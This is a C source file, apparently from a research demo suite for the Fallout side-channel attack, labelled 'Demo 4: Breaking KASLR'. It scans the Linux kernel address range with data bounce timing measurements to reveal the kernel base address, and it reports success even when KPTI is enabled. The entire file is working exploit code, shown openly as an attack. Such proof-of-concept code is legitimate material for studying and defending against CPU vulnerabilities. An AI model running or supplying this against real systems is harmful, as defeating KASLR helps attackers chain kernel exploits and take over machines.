#include "../primitives/basic_primitives.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0) //TODO: Find the exact version that introduced this change
#define KASLR_ALIGNMENT 0x1000000ll
#define KPTI_MAPPED_PAGE_OFFSET 0xa00000ll
#else
#define KASLR_ALIGNMENT 0x100000ll
#define KPTI_MAPPED_PAGE_OFFSET 0x800000ll
#endif

#define ADDRESS_RANGE_START (void*) 0xffffffff80000000ull
#define REPS 5000


int main() {
    if (!fallout_compatible()) {
        printf("Your Processor Architecture is not supported by this demo!\n");
        return 1;
    }
    void *addr = ADDRESS_RANGE_START;
    int page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size, page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    printf("Demo 4: Breaking KASLR (without access to /proc/kallsyms)\nNote that this demo does not always produce reliable results. To be sure that the results are correct, compare them with the correct base address found by ./demo_kalsr, or run this demo multiple times.\n");
    uint64_t delta = 0, kpti_offset = 0;
    int hit_threshold = data_bounce(mem, addr + delta, REPS) + 4;
    char *loading = "-\\|/";
    while (1) {
        printf("[%p... %c]                     \r", addr + delta + kpti_offset, loading[(delta / KASLR_ALIGNMENT) % 4]);
        fflush(stdout);
        int hits = data_bounce(mem, addr + delta + kpti_offset, REPS);
        if (hits >= hit_threshold) {
            if (hits > hit_threshold * 1.5) {
                if(!kpti_offset) printf("An unusual amount of hits was detected at %p, so it is likely your kernel's base address\n", addr + delta + kpti_offset);
                else printf("An unusual amount of hits was detected at %p (meaning that your kernel's base address is likely %p).\nThis happened despite KPTI being enabled on your system!\n", addr+delta+kpti_offset, addr+delta);
                break;
            }
            hit_threshold = hits;
        }
        if(!kpti_offset) kpti_offset = KPTI_MAPPED_PAGE_OFFSET;
        else {
            kpti_offset = 0;
            delta += KASLR_ALIGNMENT;
        }
        if (delta > UINT64_MAX - (uint64_t)addr){
            printf("There was no significant increase in data bounce hits anywhere in the kernel's memory region, so KASLR was not broken.\n");
            printf("Note that this method tends to be unreliable, so restarting the demo might yield different results.\n");
            break;
        }
    }
    free(mem);
    fallout_cleanup();
    return 0;
}
